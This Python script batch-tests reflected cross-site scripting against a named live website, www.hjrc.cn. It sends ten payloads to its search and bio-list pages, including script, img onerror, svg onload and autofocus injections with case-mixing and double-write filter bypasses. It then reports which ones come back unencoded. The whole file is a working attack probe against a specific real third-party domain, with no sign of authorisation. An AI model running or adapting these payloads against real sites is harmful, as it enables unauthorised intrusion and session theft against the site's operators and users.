#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS 跨站脚本漏洞批量验证
目标: www.hjrc.cn
"""

import requests
import urllib3
import urllib.parse
import time
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "http://www.hjrc.cn"

# XSS 测试 Payload 列表
PAYLOADS = [
    # 1. 原始告警中的payload
    {
        "name": "原报告Payload (textarea闭合+自闭合标签)",
        "tag": "xss_85f7210c",
        "payload": "1</textarea>--><xss_85f7210c/><!--<textarea>",
        "path": "/search.asp",
        "params": {"page": "2", "txtitle": "testtest", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 2. script标签注入
    {
        "name": "script标签注入",
        "tag": "xss_script_test",
        "payload": "<script>alert(1)</script>",
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 3. img标签注入
    {
        "name": "img标签onerror注入",
        "tag": "xss_img_test",
        "payload": '<img src=x onerror=alert(1)>',
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 4. txtitle参数注入
    {
        "name": "txtitle参数script注入",
        "tag": "xss_txtitle",
        "payload": "<script>alert(1)</script>",
        "path": "/search.asp",
        "params": {"page": "1", "key": "1", "ckey2": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "txtitle"
    },
    # 5. page参数注入
    {
        "name": "page参数注入",
        "tag": "xss_page",
        "payload": '"><script>alert(1)</script>',
        "path": "/search.asp",
        "params": {"txtitle": "test", "key": "1", "ckey2": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "page"
    },
    # 6. bio_list.asp 注入
    {
        "name": "bio_list.asp参数注入",
        "tag": "xss_bio",
        "payload": '"><script>alert(1)</script>',
        "path": "/content/bio_list.asp",
        "params": {},
        "param_inject": "id"
    },
    # 7. svg标签注入
    {
        "name": "svg标签注入",
        "tag": "xss_svg",
        "payload": '<svg onload=alert(1)>',
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 8. 双写绕过
    {
        "name": "双写绕过",
        "tag": "xss_double",
        "payload": '<scr<script>ipt>alert(1)</scr</script>ipt>',
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 9. 事件处理注入
    {
        "name": "input onfocus注入",
        "tag": "xss_onfocus",
        "payload": '" onfocus=alert(1) autofocus="',
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
    # 10. 大小写绕过
    {
        "name": "大小写绕过",
        "tag": "xss_case",
        "payload": '<ScRiPt>alert(1)</ScRiPt>',
        "path": "/search.asp",
        "params": {"page": "1", "txtitle": "test", "key": "1",
                   "szhiwei": "1", "area": "1", "keytype": "1"},
        "param_inject": "ckey2"
    },
]

print("=" * 70)
print("  XSS 跨站脚本漏洞批量验证")
print("  目标: " + TARGET)
print("=" * 70)
print()

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Referer": TARGET,
})

vuln_count = 0
vuln_list = []

for i, test in enumerate(PAYLOADS):
    params = test["params"].copy()
    params[test["param_inject"]] = test["payload"]
    
    url = f"{TARGET}{test['path']}"
    print(f"[{i+1}/{len(PAYLOADS)}] {test['name']}")
    print(f"  路径: {test['path']}")
    print(f"  注入参数: {test['param_inject']}")
    print(f"  Payload: {test['payload'][:80]}")
    
    try:
        resp = session.get(url, params=params, timeout=15, verify=False)
        body = resp.text
        
        # 判断漏洞是否触发
        is_vuln = False
        
        # 方法1: 检查payload是否原样反射
        if test["payload"] in body:
            is_vuln = True
            idx = body.find(test["payload"])
            context = body[max(0,idx-50):idx+len(test["payload"])+50]
            print(f"  状态: ✅ 存在漏洞 (Payload原样反射)")
            print(f"  反射上下文: ...{context}...")
        
        # 方法2: 检查tag标记是否反射
        elif test["tag"] in body:
            is_vuln = True
            idx = body.find(test["tag"])
            context = body[max(0,idx-50):idx+len(test["tag"])+50]
            print(f"  状态: ✅ 存在漏洞 (Tag标记反射)")
            print(f"  反射上下文: ...{context}...")
        
        # 方法3: 检查关键标签是否反射
        elif any(kw in body for kw in ["<script>", "<img", "<svg", "onerror=", "onload=", "onfocus="]):
            # 进一步确认不是页面原有的
            if test["payload"].split('"')[0] in body or "<xss_" in body:
                is_vuln = True
                print(f"  状态: ✅ 存在漏洞 (XSS标签反射)")
            else:
                print(f"  状态: ⚠️  返回200，需人工确认")
        
        # 方法4: 检查是否有错误回显
        elif resp.status_code == 200 and len(body) > 1000:
            # 搜索注入点附近
            if test["param_inject"] in params:
                inject_val = params[test["param_inject"]]
                # 检查是否有过滤特征
                if "&lt;" in body and "<" in inject_val:
                    print(f"  状态: ❌ HTML实体编码 (已过滤)")
                elif "alert" not in body and "script" not in body:
                    print(f"  状态: ❌ Payload被过滤或不反射")
                else:
                    print(f"  状态: ❓ 需人工确认")
            else:
                print(f"  状态: ❓ 需人工确认")
        
        elif resp.status_code == 404:
            print(f"  状态: ❌ 路径不存在 (404)")
        elif resp.status_code == 500:
            print(f"  状态: ❌ 服务器错误 (500)")
        else:
            print(f"  状态: ❌ HTTP {resp.status_code}")
        
        if is_vuln:
            vuln_count += 1
            vuln_list.append(test["name"])
    
    except requests.exceptions.Timeout:
        print(f"  状态: ⏱️  超时")
    except requests.exceptions.ConnectionError:
        print(f"  状态: ❌ 连接失败")
    except Exception as e:
        print(f"  状态: ❌ 异常: {e}")
    
    print()
    time.sleep(0.3)

print("=" * 70)
print(f"  验证结果汇总")
print("=" * 70)
print()
print(f"  总测试数: {len(PAYLOADS)}")
print(f"  ✅ 存在漏洞: {vuln_count} 个")
print(f"  ❌ 不存在/已过滤: {len(PAYLOADS) - vuln_count} 个")
print()

if vuln_list:
    print("  漏洞列表:")
    for i, name in enumerate(vuln_list):
        print(f"    {i+1}. {name}")

print()
print("=" * 70)
